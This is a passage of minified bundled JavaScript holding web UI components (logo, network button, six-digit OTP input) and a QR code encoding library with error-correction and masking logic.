`;var jp=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let ua=class extends H{constructor(){super(...arguments),this.logo="google"}render(){return $`<wui-icon color="inherit" size="inherit" name=${this.logo}></wui-icon> `}};ua.styles=[pe,gv];jp([O()],ua.prototype,"logo",void 0);ua=jp([z("wui-logo")],ua);const wv=q`
  :host {
    display: block;
  }

  button {
    width: 50px;
    height: 50px;
    background: var(--wui-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
  }
`;var Ld=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Wi=class extends H{constructor(){super(...arguments),this.logo="google",this.disabled=!1}render(){return $`
      <button ?disabled=${this.disabled} ontouchstart>
        <wui-logo logo=${this.logo}></wui-logo>
      </button>
    `}};Wi.styles=[pe,Ye,wv];Ld([O()],Wi.prototype,"logo",void 0);Ld([O({type:Boolean})],Wi.prototype,"disabled",void 0);Wi=Ld([z("wui-logo-select")],Wi);const bv=q`
  :host {
    display: block;
  }

  button {
    border-radius: var(--wui-border-radius-3xl);
    display: flex;
    gap: var(--wui-spacing-xs);
    padding: var(--wui-spacing-2xs) var(--wui-spacing-s) var(--wui-spacing-2xs)
      var(--wui-spacing-xs);
    border: 1px solid var(--wui-gray-glass-010);
    background-color: var(--wui-gray-glass-005);
    color: var(--wui-color-fg-100);
  }

  button:disabled {
    border: 1px solid var(--wui-gray-glass-005);
    background-color: var(--wui-gray-glass-015);
    color: var(--wui-gray-glass-015);
  }

  @media (hover: hover) and (pointer: fine) {
    button:hover:enabled {
      background-color: var(--wui-gray-glass-010);
    }

    button:active:enabled {
      background-color: var(--wui-gray-glass-015);
    }
  }

  wui-image,
  wui-icon-box {
    border-radius: var(--wui-border-radius-3xl);
    width: 24px;
    height: 24px;
    box-shadow: 0 0 0 2px var(--wui-gray-glass-005);
  }
`;var jd=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let zi=class extends H{constructor(){super(...arguments),this.imageSrc=void 0,this.disabled=!1}render(){return $`
      <button ?disabled=${this.disabled}>
        ${this.visualTemplate()}
        <wui-text variant="paragraph-600" color="inherit">
          <slot></slot>
        </wui-text>
      </button>
    `}visualTemplate(){return this.imageSrc?$`<wui-image src=${this.imageSrc}></wui-image>`:$`
      <wui-icon-box
        size="sm"
        iconColor="inverse-100"
        backgroundColor="fg-100"
        icon="networkPlaceholder"
      ></wui-icon-box>
    `}};zi.styles=[pe,Ye,bv];jd([O()],zi.prototype,"imageSrc",void 0);jd([O({type:Boolean})],zi.prototype,"disabled",void 0);zi=jd([z("wui-network-button")],zi);const yv=q`
  :host {
    position: relative;
    display: block;
  }
`;var Fd=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Hi=class extends H{constructor(){super(...arguments),this.length=6,this.valueArr=Array.from({length:this.length}).map(()=>""),this.numerics=[],this.shouldInputBeEnabled=e=>this.valueArr.slice(0,e).every(r=>r!==""),this.handleKeyDown=(e,n)=>{const r=e.target,o=this.getInputElement(r),i=["ArrowLeft","ArrowRight","Shift","Delete"];if(!o)return;i.includes(e.key)&&e.preventDefault();const a=o.selectionStart;switch(e.key){case"ArrowLeft":a&&o.setSelectionRange(a+1,a+1),this.focusInputField("prev",n);break;case"ArrowRight":this.focusInputField("next",n);break;case"Shift":this.focusInputField("next",n);break;case"Delete":o.value===""?this.focusInputField("prev",n):this.updateInput(o,n,"");break;case"Backspace":o.value===""?this.focusInputField("prev",n):this.updateInput(o,n,"");break}},this.focusInputField=(e,n)=>{if(e==="next"){const r=n+1;if(!this.shouldInputBeEnabled(r))return;const o=this.numerics[r<this.length?r:n],i=o?this.getInputElement(o):void 0;i&&(i.disabled=!1,i.focus())}if(e==="prev"){const r=n-1,o=this.numerics[r>-1?r:n],i=o?this.getInputElement(o):void 0;i&&i.focus()}}}firstUpdated(){var n,r;const e=(n=this.shadowRoot)==null?void 0:n.querySelectorAll("wui-input-numeric");e&&(this.numerics=Array.from(e)),(r=this.numerics[0])==null||r.focus()}render(){return $`
      <wui-flex gap="xxs" data-testid="wui-otp-input">
        ${Array.from({length:this.length}).map((e,n)=>$`
            <wui-input-numeric
              @input=${r=>this.handleInput(r,n)}
              @keydown=${r=>this.handleKeyDown(r,n)}
              .disabled=${!this.shouldInputBeEnabled(n)}
            >
            </wui-input-numeric>
          `)}
      </wui-flex>
    `}updateInput(e,n,r){const o=this.numerics[n],i=e||(o?this.getInputElement(o):void 0);i&&(i.value=r,this.valueArr=this.valueArr.map((a,s)=>s===n?r:a))}handleInput(e,n){const r=e.target,o=this.getInputElement(r);if(o){const i=o.value;e.inputType==="insertFromPaste"?this.handlePaste(o,i,n):Be.isNumber(i)&&e.data?(this.updateInput(o,n,e.data),this.focusInputField("next",n)):this.updateInput(o,n,"")}this.dispatchInputChangeEvent()}handlePaste(e,n,r){const o=n[0];if(o&&Be.isNumber(o)){this.updateInput(e,r,o);const a=n.substring(1);if(r+1<this.length&&a.length){const s=this.numerics[r+1],c=s?this.getInputElement(s):void 0;c&&this.handlePaste(c,a,r+1)}else this.focusInputField("next",r)}else this.updateInput(e,r,"")}getInputElement(e){var n;return(n=e.shadowRoot)!=null&&n.querySelector("input")?e.shadowRoot.querySelector("input"):null}dispatchInputChangeEvent(){const e=this.valueArr.join("");this.dispatchEvent(new CustomEvent("inputChange",{detail:e,bubbles:!0,composed:!0}))}};Hi.styles=[pe,yv];Fd([O({type:Number})],Hi.prototype,"length",void 0);Fd([ee()],Hi.prototype,"valueArr",void 0);Hi=Fd([z("wui-otp")],Hi);var Ha={},vv=function(){return typeof Promise=="function"&&Promise.prototype&&Promise.prototype.then},Fp={},Wt={};let Wd;const xv=[0,26,44,70,100,134,172,196,242,292,346,404,466,532,581,655,733,815,901,991,1085,1156,1258,1364,1474,1588,1706,1828,1921,2051,2185,2323,2465,2611,2761,2876,3034,3196,3362,3532,3706];Wt.getSymbolSize=function(e){if(!e)throw new Error('"version" cannot be null or undefined');if(e<1||e>40)throw new Error('"version" should be in range from 1 to 40');return e*4+17};Wt.getSymbolTotalCodewords=function(e){return xv[e]};Wt.getBCHDigit=function(t){let e=0;for(;t!==0;)e++,t>>>=1;return e};Wt.setToSJISFunction=function(e){if(typeof e!="function")throw new Error('"toSJISFunc" is not a valid function.');Wd=e};Wt.isKanjiModeEnabled=function(){return typeof Wd<"u"};Wt.toSJIS=function(e){return Wd(e)};var jc={};(function(t){t.L={bit:1},t.M={bit:0},t.Q={bit:3},t.H={bit:2};function e(n){if(typeof n!="string")throw new Error("Param is not a string");switch(n.toLowerCase()){case"l":case"low":return t.L;case"m":case"medium":return t.M;case"q":case"quartile":return t.Q;case"h":case"high":return t.H;default:throw new Error("Unknown EC Level: "+n)}}t.isValid=function(r){return r&&typeof r.bit<"u"&&r.bit>=0&&r.bit<4},t.from=function(r,o){if(t.isValid(r))return r;try{return e(r)}catch{return o}}})(jc);function Wp(){this.buffer=[],this.length=0}Wp.prototype={get:function(t){const e=Math.floor(t/8);return(this.buffer[e]>>>7-t%8&1)===1},put:function(t,e){for(let n=0;n<e;n++)this.putBit((t>>>e-n-1&1)===1)},getLengthInBits:function(){return this.length},putBit:function(t){const e=Math.floor(this.length/8);this.buffer.length<=e&&this.buffer.push(0),t&&(this.buffer[e]|=128>>>this.length%8),this.length++}};var _v=Wp;function Va(t){if(!t||t<1)throw new Error("BitMatrix size must be defined and greater than 0");this.size=t,this.data=new Uint8Array(t*t),this.reservedBit=new Uint8Array(t*t)}Va.prototype.set=function(t,e,n,r){const o=t*this.size+e;this.data[o]=n,r&&(this.reservedBit[o]=!0)};Va.prototype.get=function(t,e){return this.data[t*this.size+e]};Va.prototype.xor=function(t,e,n){this.data[t*this.size+e]^=n};Va.prototype.isReserved=function(t,e){return this.reservedBit[t*this.size+e]};var Ev=Va,zp={};(function(t){const e=Wt.getSymbolSize;t.getRowColCoords=function(r){if(r===1)return[];const o=Math.floor(r/7)+2,i=e(r),a=i===145?26:Math.ceil((i-13)/(2*o-2))*2,s=[i-7];for(let c=1;c<o-1;c++)s[c]=s[c-1]-a;return s.push(6),s.reverse()},t.getPositions=function(r){const o=[],i=t.getRowColCoords(r),a=i.length;for(let s=0;s<a;s++)for(let c=0;c<a;c++)s===0&&c===0||s===0&&c===a-1||s===a-1&&c===0||o.push([i[s],i[c]]);return o}})(zp);var Hp={};const Cv=Wt.getSymbolSize,a0=7;Hp.getPositions=function(e){const n=Cv(e);return[[0,0],[n-a0,0],[0,n-a0]]};var Vp={};(function(t){t.Patterns={PATTERN000:0,PATTERN001:1,PATTERN010:2,PATTERN011:3,PATTERN100:4,PATTERN101:5,PATTERN110:6,PATTERN111:7};const e={N1:3,N2:3,N3:40,N4:10};t.isValid=function(o){return o!=null&&o!==""&&!isNaN(o)&&o>=0&&o<=7},t.from=function(o){return t.isValid(o)?parseInt(o,10):void 0},t.getPenaltyN1=function(o){const i=o.size;let a=0,s=0,c=0,l=null,u=null;for(let p=0;p<i;p++){s=c=0,l=u=null;for(let m=0;m<i;m++){let g=o.get(p,m);g===l?s++:(s>=5&&(a+=e.N1+(s-5)),l=g,s=1),g=o.get(m,p),g===u?c++:(c>=5&&(a+=e.N1+(c-5)),u=g,c=1)}s>=5&&(a+=e.N1+(s-5)),c>=5&&(a+=e.N1+(c-5))}return a},t.getPenaltyN2=function(o){const i=o.size;let a=0;for(let s=0;s<i-1;s++)for(let c=0;c<i-1;c++){const l=o.get(s,c)+o.get(s,c+1)+o.get(s+1,c)+o.get(s+1,c+1);(l===4||l===0)&&a++}return a*e.N2},t.getPenaltyN3=function(o){const i=o.size;let a=0,s=0,c=0;for(let l=0;l<i;l++){s=c=0;for(let u=0;u<i;u++)s=s<<1&2047|o.get(l,u),u>=10&&(s===1488||s===93)&&a++,c=c<<1&2047|o.get(u,l),u>=10&&(c===1488||c===93)&&a++}return a*e.N3},t.getPenaltyN4=function(o){let i=0;const a=o.data.length;for(let c=0;c<a;c++)i+=o.data[c];return Math.abs(Math.ceil(i*100/a/5)-10)*e.N4};function n(r,o,i){switch(r){case t.Patterns.PATTERN000:return(o+i)%2===0;case t.Patterns.PATTERN001:return o%2===0;case t.Patterns.PATTERN010:return i%3===0;case t.Patterns.PATTERN011:return(o+i)%3===0;case t.Patterns.PATTERN100:return(Math.floor(o/2)+Math.floor(i/3))%2===0;case t.Patterns.PATTERN101:return o*i%2+o*i%3===0;case t.Patterns.PATTERN110:return(o*i%2+o*i%3)%2===0;case t.Patterns.PATTERN111:return(o*i%3+(o+i)%2)%2===0;default:throw new Error("bad maskPattern:"+r)}}t.applyMask=function(o,i){const a=i.size;for(let s=0;s<a;s++)for(let c=0;c<a;c++)i.isReserved(c,s)||i.xor(c,s,n(o,c,s))},t.getBestMask=function(o,i){const a=Object.keys(t.Patterns).length;let s=0,c=1/0;for(let l=0;l<a;l++){i(l),t.applyMask(l,o);const u=t.getPenaltyN1(o)+t.getPenaltyN2(o)+t.getPenaltyN3(o)+t.getPenaltyN4(o);t.applyMask(l,o),u<c&&(c=u,s=l)}return s}})(Vp);var Fc={};const ir=jc,cs=[1,1,1,1,1,1,1,1,1,1,2,2,1,2,2,4,1,2,4,4,2,4,4,4,2,4,6,5,2,4,6,6,2,5,8,8,4,5,8,8,4,5,8,11,4,8,10,11,4,9,12,16,4,9,16,16,6,10,12,18,6,10,17,16,6,11,16,19,6,13,18,21,7,14,21,25,8,16,20,25,8,17,23,25,9,17,23,34,9,18,25,30,10,20,27,32,12,21,29,35,12,23,34,37,12,25,34,40,13,26,35,42,14,28,38,45,15,29,40,48,16,31,43,51,17,33,45,54,18,35,48,57,19,37,51,60,19,38,53,63,20,40,56,66,21,43,59,70,22,45,62,74,24,47,65,77,25,49,68,81],ls=[7,10,13,17,10,16,22,28,15,26,36,44,20,36,52,64,26,48,72,88,36,64,96,112,40,72,108,130,48,88,132,156,60,110,160,192,72,130,192,224,80,150,224,264,96,176,260,308,104,198,288,352,120,216,320,384,132,240,360,432,144,280,408,480,168,308,448,532,180,338,504,588,196,364,546,650,224,416,600,700,224,442,644,750,252,476,690,816,270,504,750,900,300,560,810,960,312,588,870,1050,336,644,952,1110,360,700,1020,1200,390,728,1050,1260,420,784,1140,1350,450,812,1200,1440,480,868,1290,1530,510,924,1350,1620,540,980,1440,1710,570,1036,1530,1800,570,1064,1590,1890,600,1120,1680,1980,630,1204,1770,2100,660,1260,1860,2220,720,1316,1950,2310,750,1372,2040,2430];Fc.getBlocksCount=function(e,n){switch(n){case ir.L:return cs[(e-1)*4+0];case ir.M:return cs[(e-1)*4+1];case ir.Q:return cs[(e-1)*4+2];case ir.H:return cs[(e-1)*4+3];default:return}};Fc.getTotalCodewordsCount=function(e,n){switch(n){case ir.L:return ls[(e-1)*4+0];case ir.M:return ls[(e-1)*4+1];case ir.Q:return ls[(e-1)*4+2];case ir.H:return ls[(e-1)*4+3];default:return}};var Zp={},Wc={};const Do=new Uint8Array(512),Bs=new Uint8Array(256);(function(){let e=1;for(let n=0;n<255;n++)Do[n]=e,Bs[e]=n,e<<=1,e&256&&(e^=285);for(let n=255;n<512;n++)Do[n]=Do[n-255]})();Wc.log=function(e){if(e<1)throw new Error("log("+e+")");return Bs[e]};Wc.exp=function(e){return Do[e]};Wc.mul=function(e,n){return e===0||n===0?0:Do[Bs[e]+Bs[n]]};(function(t){const e=Wc;t.mul=function(r,o){const i=new Uint8Array(r.length+o.length-1);for(let a=0;a<r.length;a++)for(let s=0;s<o.length;s++)i[a+s]^=e.mul(r[a],o[s]);return i},t.mod=function(r,o){let i=new Uint8Array(r);for(;i.length-o.length>=0;){const a=i[0];for(let c=0;c<o.length;c++)i[c]^=e.mul(o[c],a);let s=0;for(;s<i.length&&i[s]===0;)s++;i=i.slice(s)}return i},t.generateECPolynomial=function(r){let o=new Uint8Array([1]);for(let i=0;i<r;i++)o=t.mul(o,new Uint8Array([1,e.exp(i)]));return o}})(Zp);const Gp=Zp;function zd(t){this.genPoly=void 0,this.degree=t,this.degree&&this.initialize(this.degree)}zd.prototype.initialize=function(e){this.degree=e,this.genPoly=Gp.generateECPolynomial(this.degree)};zd.prototype.encode=function(e){if(!this.genPoly)throw new Error("Encoder not initialized");const n=new Uint8Array(e.length+this.degree);n.set(e);const r=Gp.mod(n,this.genPoly),o=this.degree-r.length;if(o>0){const i=new Uint8Array(this.degree);return i.set(r,o),i}return r};var Sv=zd,qp={},Sr={},Hd={};Hd.isValid=function(e){return!isNaN(e)&&e>=1&&e<=40};var Rn={};const Kp="[0-9]+",Av="[A-Z $%*+\\-./:]+";let da="(?:[u3000-u303F]|[u3040-u309F]|[u30A0-u30FF]|[uFF00-uFFEF]|[u4E00-u9FAF]|[u2605-u2606]|[u2190-u2195]|u203B|[u2010u2015u2018u2019u2025u2026u201Cu201Du2225u2260]|[u0391-u0451]|[u00A7u00A8u00B1u00B4u00D7u00F7])+";da=da.replace(/u/g,"\\u");const Tv="(?:(?![A-Z0-9 $%*+\\-./:]|"+da+`)(?:.|[\r
]))+`;Rn.KANJI=new RegExp(da,"g");Rn.BYTE_KANJI=new RegExp("[^A-Z0-9 $%*+\\-./:]+","g");Rn.BYTE=new RegExp(Tv,"g");Rn.NUMERIC=new RegExp(Kp,"g");Rn.ALPHANUMERIC=new RegExp(Av,"g");const Iv=new RegExp("^"+da+"$"),$v=new RegExp("^"+Kp+"$"),Ov=new RegExp("^[A-Z0-9 $%*+\\-./:]+$");Rn.testKanji=function(e){return Iv.test(e)};Rn.testNumeric=function(e){return $v.test(e)};Rn.testAlphanumeric=function(e){return Ov.test(e)};(function(t){const e=Hd,n=Rn;t.NUMERIC={id:"Numeric",bit:1,ccBits:[10,12,14]},t.ALPHANUMERIC={id:"Alphanumeric",bit:2,ccBits:[9,11,13]},t.BYTE={id:"Byte",bit:4,ccBits:[8,16,16]},t.KANJI={id:"Kanji",bit:8,ccBits:[8,10,12]},t.MIXED={bit:-1},t.getCharCountIndicator=function(i,a){if(!i.ccBits)throw new Error("Invalid mode: "+i);if(!e.isValid(a))throw new Error("Invalid version: "+a);return a>=1&&a<10?i.ccBits[0]:a<27?i.ccBits[1]:i.ccBits[2]},t.getBestModeForData=function(i){return n.testNumeric(i)?t.NUMERIC:n.testAlphanumeric(i)?t.ALPHANUMERIC:n.testKanji(i)?t.KANJI:t.BYTE},t.toString=function(i){if(i&&i.id)return i.id;throw new Error("Invalid mode")},t.isValid=function(i){return i&&i.bit&&i.ccBits};function r(o){if(typeof o!="string")throw new Error("Param is not a string");switch(o.toLowerCase()){case"numeric":return t.NUMERIC;case"alphanumeric":return t.ALPHANUMERIC;case"kanji":return t.KANJI;case"byte":return t.BYTE;default:throw new Error("Unknown mode: "+o)}}t.from=function(i,a){if(t.isValid(i))return i;try{return r(i)}catch{return a}}})(Sr);(function(t){const e=Wt,n=Fc,r=jc,o=Sr,i=Hd,a=7973,s=e.getBCHDigit(a);function c(m,g,w){for(let v=1;v<=40;v++)if(g<=t.getCapacity(v,w,m))return v}function l(m,g){return o.getCharCountIndicator(m,g)+4}function u(m,g){let w=0;return m.forEach(function(v){const E=l(v.mode,g);w+=E+v.getBitsLength()}),w}function p(m,g){for(let w=1;w<=40;w++)if(u(m,w)<=t.getCapacity(w,g,o.MIXED))return w}t.from=function(g,w){return i.isValid(g)?parseInt(g,10):w},t.getCapacity=function(g,w,v){if(!i.isValid(g))throw new Error("Invalid QR Code version");typeof v>"u"&&(v=o.BYTE);const E=e.getSymbolTotalCodewords(g),I=n.getTotalCodewordsCount(g,w),b=(E-I)*8;if(v===o.MIXED)return b;const _=b-l(v,g);switch(v){case o.NUMERIC:return Math.floor(_/10*3);case o.ALPHANUMERIC:return Math.floor(_/11*2);case o.KANJI:return Math.floor(_/13);case o.BYTE:default:return Math.floor(_/8)}},t.getBestVersionForData=function(g,w){let v;const E=r.from(w,r.M);if(Array.isArray(g)){if(g.length>1)return p(g,E);if(g.length===0)return 1;v=g[0]}else v=g;return c(v.mode,v.getLength(),E)},t.getEncodedBits=function(g){if(!i.isValid(g)||g<7)throw new Error("Invalid QR Code version");let w=g<<12;for(;e.getBCHDigit(w)-s>=0;)w^=a<<e.getBCHDigit(w)-s;return g<<12|w}})(qp);var Yp={};const gu=Wt,Jp=1335,Pv=21522,s0=gu.getBCHDigit(Jp);Yp.getEncodedBits=function(e,n){const r=e.bit<<3|n;let o=r<<10;for(;gu.getBCHDigit(o)-s0>=0;)o^=Jp<<gu.getBCHDigit(o)-s0;return(r<<10|o)^Pv};var Xp={};const Dv=Sr;function Vi(t){this.mode=Dv.NUMERIC,this.data=t.toString()}Vi.getBitsLength=function(e){return 10*Math.floor(e/3)+(e%3?e%3*3+1:0)};Vi.prototype.getLength=function(){return this.data.length};Vi.prototype.getBitsLength=function(){return Vi.getBitsLength(this.data.length)};Vi.prototype.write=function(e){let n,r,o;for(n=0;n+3<=this.data.length;n+=3)r=this.data.substr(n,3),o=parseInt(r,10),e.put(o,10);const i=this.data.length-n;i>0&&(r=this.data.substr(n),o=parseInt(r,10),e.put(o,i*3+1))};var Rv=Vi;const Nv=Sr,Tl=["0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"," ","$","%","*","+","-",".","/",":"];function Zi(t){this.mode=Nv.ALPHANUMERIC,this.data=t}Zi.getBitsLength=function(e){return 11*Math.floor(e/2)+6*(e%2)};Zi.prototype.getLength=function(){return this.data.length};Zi.prototype.getBitsLength=function(){return Zi.getBitsLength(this.data.length)};Zi.prototype.write=function(e){let n;for(n=0;n+2<=this.data.length;n+=2){let r=Tl.indexOf(this.data[n])*45;r+=Tl.indexOf(this.data[n+1]),e.put(r,11)}this.data.length%2&&e.put(Tl.indexOf(this.data[n]),6)};var kv=Zi,Mv=function(e){for(var n=[],r=e.length,o=0;o<r;o++){var i=e.charCodeAt(o);if(i>=55296&&i<=56319&&r>o+1){var a=e.charCodeAt(o+1);a>=56320&&a<=57343&&(i=(i-55296)*1024+a-56320+65536,o+=1)}if(i<128){n.push(i);continue}if(i<2048){n.push(i>>6|192),n.push(i&63|128);continue}if(i<55296||i>=57344&&i<65536){n.push(i>>12|224),n.push(i>>6&63|128),n.push(i&63|128);continue}if(i>=65536&&i<=1114111){n.push(i>>18|240),n.push(i>>12&63|128),n.push(i>>6&63|128),n.push(i&63|128);continue}n.push(239,191,189)}return new Uint8Array(n).buffer};const Uv=Mv,Bv=Sr;function Gi(t){this.mode=Bv.BYTE,typeof t=="string"&&(t=Uv(t)),this.data=new Uint8Array(t)}Gi.getBitsLength=function(e){return e*8};Gi.prototype.getLength=function(){return this.data.length};Gi.prototype.getBitsLength=function(){return Gi.getBitsLength(this.data.length)};Gi.prototype.write=function(t){for(let e=0,n=this.data.length;e<n;e++)t.put(this.data[e],8)};var Lv=Gi;const jv=Sr,Fv=Wt;function qi(t){this.mode=jv.KANJI,this.data=t}qi.getBitsLength=function(e){return e*13};qi.prototype.getLength=function(){return this.data.length};qi.prototype.getBitsLength=function(){return qi.getBitsLength(this.data.length)};qi.prototype.write=function(t){let e;for(e=0;e<this.data.length;e++){let n=Fv.toSJIS(this.data[e]);if(n>=33088&&n<=40956)n-=33088;else if(n>=57408&&n<=60351)n-=49472;else throw new Error("Invalid SJIS character: "+this.data[e]+`
Make sure your charset is UTF-8`);n=(n>>>8&255)*192+(n&255),t.put(n,13)}};var Wv=qi,Qp={exports:{}};(function(t){var e={single_source_shortest_paths:function(n,r,o){var i={},a={};a[r]=0;var s=e.PriorityQueue.make();s.push(r,0);for(var c,l,u,p,m,g,w,v,E;!s.empty();){c=s.pop(),l=c.value,p=c.cost,m=n[l]||{};for(u in m)m.hasOwnProperty(u)&&(g=m[u],w=p+g,v=a[u],E=typeof a[u]>"u",(E||v>w)&&(a[u]=w,s.push(u,w),i[u]=l))}if(typeof o<"u"&&typeof a[o]>"u"){var I=["Could not find a path from ",r," to ",o,"."].join("");throw new Error(I)}return i},extract_shortest_path_from_predecessor_list:function(n,r){for(var o=[],i=r;i;)o.push(i),n[i],i=n[i];return o.reverse(),o},find_path:function(n,r,o){var i=e.single_source_shortest_paths(n,r,o);return e.extract_shortest_path_from_predecessor_list(i,o)},PriorityQueue:{make:function(n){var r=e.PriorityQueue,o={},i;n=n||{};for(i in r)r.hasOwnProperty(i)&&(o[i]=r[i]);return o.queue=[],o.sorter=n.sorter||r.default_sorter,o},default_sorter:function(n,r){return n.cost-r.cost},push:function(n,r){var o={value:n,cost:r};this.queue.push(o),this.queue.sort(this.sorter)},pop:function(){return this.queue.shift()},empty:function(){return this.queue.length===0}}};t.exports=e})(Qp);var zv=Qp.exports;(function(t){const e=Sr,n=Rv,r=kv,o=Lv,i=Wv,a=Rn,s=Wt,c=zv;function l(I){return unescape(encodeURIComponent(I)).length}function u(I,b,_){const x=[];let C;for(;(C=I.exec(_))!==null;)x.push({data:C[0],index:C.index,mode:b,length:C[0].length});return x}function p(I){const b=u(a.NUMERIC,e.NUMERIC,I),_=u(a.ALPHANUMERIC,e.ALPHANUMERIC,I);let x,C;return s.isKanjiModeEnabled()?(x=u(a.BYTE,e.BYTE,I),C=u(a.KANJI,e.KANJI,I)):(x=u(a.BYTE_KANJI,e.BYTE,I),C=[]),b.concat(_,x,C).sort(function(f,T){return f.index-T.index}).map(function(f){return{data:f.data,mode:f.mode,length:f.length}})}function m(I,b){switch(b){case e.NUMERIC:return n.getBitsLength(I);case e.ALPHANUMERIC:return r.getBitsLength(I);case e.KANJI:return i.getBitsLength(I);case e.BYTE:return o.getBitsLength(I)}}function g(I){return I.reduce(function(b,_){const x=b.length-1>=0?b[b.length-1]:null;return x&&x.mode===_.mode?(b[b.length-1].data+=_.data,b):(b.push(_),b)},[])}function w(I){const b=[];for(let _=0;_<I.length;_++){const x=I[_];switch(x.mode){case e.NUMERIC:b.push([x,{data:x.data,mode:e.ALPHANUMERIC,length:x.length},{data:x.data,mode:e.BYTE,length:x.length}]);break;case e.ALPHANUMERIC:b.push([x,{data:x.data,mode:e.BYTE,length:x.length}]);break;case e.KANJI:b.push([x,{data:x.data,mode:e.BYTE,length:l(x.data)}]);break;case e.BYTE:b.push([{data:x.data,mode:e.BYTE,length:l(x.data)}])}}return b}function v(I,b){const _={},x={start:{}};let C=["start"];for(let A=0;A<I.length;A++){const f=I[A],T=[];for(let R=0;R<f.length;R++){const N=f[R],k=""+A+R;T.push(k),_[k]={node:N,lastCount:0},x[k]={};for(let Y=0;Y<C.length;Y++){const re=C[Y];_[re]&&_[re].node.mode===N.mode?(x[re][k]=m(_[re].lastCount+N.length,N.mode)-m(_[re].lastCount,N.mode),_[re].lastCount+=N.length):(_[re]&&(_[re].lastCount=N.length),x[re][k]=m(N.length,N.mode)+4+e.getCharCountIndicator(N.mode,b))}}C=T}for(let A=0;A<C.length;A++)x[C[A]].end=0;return{map:x,table:_}}function E(I,b){let _;const x=e.getBestModeForData(I);if(_=e.from(b,x),_!==e.BYTE&&_.bit<x.bit)throw new Error('"'+I+'" cannot be encoded with mode '+e.toString(_)+`.
 Suggested mode is: `+e.toString(x));switch(_===e.KANJI&&!s.isKanjiModeEnabled()&&(_=e.BYTE),_){case e.NUMERIC:return new n(I);case e.ALPHANUMERIC:return new r(I);case e.KANJI:return new i(I);case e.BYTE:return new o(I)}}t.fromArray=function(b){return b.reduce(function(_,x){return typeof x=="string"?_.push(E(x,null)):x.data&&_.push(E(x.data,x.mode)),_},[])},t.fromString=function(b,_){const x=p(b,s.isKanjiModeEnabled()),C=w(x),A=v(C,_),f=c.find_path(A.map,"start","end"),T=[];for(let R=1;R<f.length-1;R++)T.push(A.table[f[R]].node);return t.fromArray(g(T))},t.rawSplit=function(b){return t.fromArray(p(b,s.isKanjiModeEnabled()))}})(Xp);const zc=Wt,Il=jc,Hv=_v,Vv=Ev,Zv=zp,Gv=Hp,wu=Vp,bu=Fc,qv=Sv,Ls=qp,Kv=Yp,Yv=Sr,$l=Xp;function Jv(t,e){const n=t.size,r=Gv.getPositions(e);for(let o=0;o<r.length;o++){const i=r[o][0],a=r[o][1];for(let s=-1;s<=7;s++)if(!(i+s<=-1||n<=i+s))for(let c=-1;c<=7;c++)a+c<=-1||n<=a+c||(s>=0&&s<=6&&(c===0||c===6)||c>=0&&c<=6&&(s===0||s===6)||s>=2&&s<=4&&c>=2&&c<=4?t.set(i+s,a+c,!0,!0):t.set(i+s,a+c,!1,!0))}}function Xv(t){const e=t.size;for(let n=8;n<e-8;n++){const r=n%2===0;t.set(n,6,r,!0),t.set(6,n,r,!0)}}function Qv(t,e){const n=Zv.getPositions(e);for(let r=0;r<n.length;r++){const o=n[r][0],i=n[r][1];for(let a=-2;a<=2;a++)for(let s=-2;s<=2;s++)a===-2||a===2||s===-2||s===2||a===0&&s===0?t.set(o+a,i+s,!0,!0):t.set(o+a,i+s,!1,!0)}}function e5(t,e){const n=t.size,r=Ls.getEncodedBits(e);let o,i,a;for(let s=0;s<18;s++)o=Math.floor(s/3),i=s%3+n-8-3,a=(r>>s&1)===1,t.set(o,i,a,!0),t.set(i,o,a,!0)}function Ol(t,e,n){const r=t.size,o=Kv.getEncodedBits(e,n);let i,a;for(i=0;i<15;i++)a=(o>>i&1)===1,i<6?t.set(i,8,a,!0):i<8?t.set(i+1,8,a,!0):t.set(r-15+i,8,a,!0),i<8?t.set(8,r-i-1,a,!0):i<9?t.set(8,15-i-1+1,a,!0):t.set(8,15-i-1,a,!0);t.set(r-8,8,1,!0)}function t5(t,e){const n=t.size;let r=-1,o=n-1,i=7,a=0;for(let s=n-1;s>0;s-=2)for(s===6&&s--;;){for(let c=0;c<2;c++)if(!t.isReserved(o,s-c)){let l=!1;a<e.length&&(l=(e[a]>>>i&1)===1),t.set(o,s-c,l),i--,i===-1&&(a++,i=7)}if(o+=r,o<0||n<=o){o-=r,r=-r;break}}}function n5(t,e,n){const r=new Hv;n.forEach(function(c){r.put(c.mode.bit,4),r.put(c.getLength(),Yv.getCharCountIndicator(c.mode,t)),c.write(r)});const o=zc.getSymbolTotalCodewords(t),i=bu.getTotalCodewordsCount(t,e),a=(o-i)*8;for(r.getLengthInBits()+4<=a&&r.put(0,4);r.getLengthInBits()%8!==0;)r.putBit(0);const s=(a-r.getLengthInBits())/8;for(let c=0;c<s;c++)r.put(c%2?17:236,8);return r5(r,t,e)}function r5(t,e,n){const 